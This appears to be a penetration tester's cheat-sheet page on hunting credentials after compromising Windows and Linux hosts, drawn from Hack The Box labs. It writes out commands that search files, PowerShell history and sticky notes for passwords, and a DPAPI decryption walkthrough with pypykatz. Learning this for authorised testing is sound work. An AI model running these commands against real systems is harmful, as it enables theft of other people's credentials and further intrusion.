---
icon: lucide/scroll-text
---

# Cred hunting

## Windows

First step is always to dump any existing databases. Look for database credentials in the web app's config file, then access the database and look for user hashes.

Then we can look for interesting files:

``` text
# look in config files
PS C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
# e.g., C:\inetpub\wwwroot\web.config

# or in powershell
PS C:\> select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password

# search by file extension
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*

# or
where /R C:\ *.config

# or
PS C:\ > Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore

# Unattended Installation Files
dir /s /b C:\unattend.xml 2>nul & dir /s /b D:\unattend.xml 2>nul

# dictionary files
PS C:\> gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password

# Powershell history file
# First, find where it's saved
PS C:\> (Get-PSReadLineOption).HistorySavePath
# Then fetch it 
gc (Get-PSReadLineOption).HistorySavePath
# Get all history files. re-do once admin
PS C:\> foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}

# If we find something like this in a script
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
# We can do this
PS C:\> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\> $credential.GetNetworkCredential().username
PS C:\> $credential.GetNetworkCredential().password

# Read their sticky notes. We're looking for plum.sqlite in the directory below
C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\
# Two options to read this: sqliteBrowser or PowerShell
# 1) https://sqlitebrowser.org/dl/
# 2) https://github.com/RamblingCookieMonster/PSSQLite
# we're looking for table Note and column Text ("select Text from Note;")
PS C:\> Set-ExecutionPolicy Bypass -Scope Process
PS C:\> cd .\PSSQLite\
PS C:\> Import-Module .\PSSQLite.psd1
PS C:\> $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
PS C:\> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap

# In fact just go through all of the AppData for every user to see what's interesting there

# Use snaffler to look for more credentials if in AD
```

DPAPI extraction:

``` text
# From HTB Vintage

C:\Users\C.Neri\appdata\roaming\microsoft\credentials> gci -force

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   5:08 PM            430 C4BB96844A5C9DD45D5B6A9859252BA6

# we can't downlaod this directly, so let's convert to b64 first

[Convert]::ToBase64String([IO.File]::ReadAllBytes("$(pwd)\C4BB96844A5C9DD45D5B6A9859252BA6"))

# then copy and decode this into our attack as credblob
# next we go to C:\Users\username\appdata\roaming\microsoft\protect\[sid]
# with gci force we will see a few different things
# we don't know which is which, so we get both

[Convert]::ToBase64String([IO.File]::ReadAllBytes("$(pwd)\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847"))

[Convert]::ToBase64String([IO.File]::ReadAllBytes("$(pwd)\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b"))

# both were decoded and saved as dpapiblob1 and dpapiblob2
# now in our attack. SID is the directory name above, so should be easy to get
# we output those 3 lines into a pkf file

pypykatz dpapi prekey password 'S-1-5-....' 'P@ssword123' | tee pkf

# now we use the prekey generated above with the two blobs we saved before

pypykatz dpapi masterkey dpapiblob1 pkf -o mkf1
pypykatz dpapi masterkey dpapiblob2 pkf -o mkf2

# this generates two masterkey files. We can combine them into a single one called mkf that looks like this:

{
    "backupkeys": {},
    "masterkeys": {
        "4dbf04d8-529b-4b4c-b4ae-8e875e4fe847": "55d51b40d9aa74e8cdc44a6d24a25c96451449229739a1c9dd2bb50048b60a652b5330ff2635a511210209b28f81c3efe16b5aee3d84b5a1be3477a62e25989f",
        "99cf41a3-a552-4cf7-a8d7-aca2d6f7339b": "f8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a"
    }
}

# now let's try to decrypt them

pypykatz dpapi credential mkf credblob

# if everything works, the output will look something like this

type : GENERIC (1)
last_written : 133622465035169458
target : LegacyGeneric:target=admin_acc
username : vintage\c.neri_adm
unknown4 : Uncr4ck4bl3P4ssW0rd0312

```


## Linux

First step is always to dump any existing databases. Look for database credentials in the web app's config file, then access the database and look for user hashes.

Then we can look for interesting files:

``` text
# Search for .conf and .config files
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

# Or:
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
# sometimes we have access to the conf file even if the folder is not accessible

# Find config in /proc/
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null

# Look for scripts with "pass" in them
find / -name *.sh 2>/dev/null | xargs cat | grep "pass"

for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "pass" $i 2>/dev/null | grep -v "\#";done
```

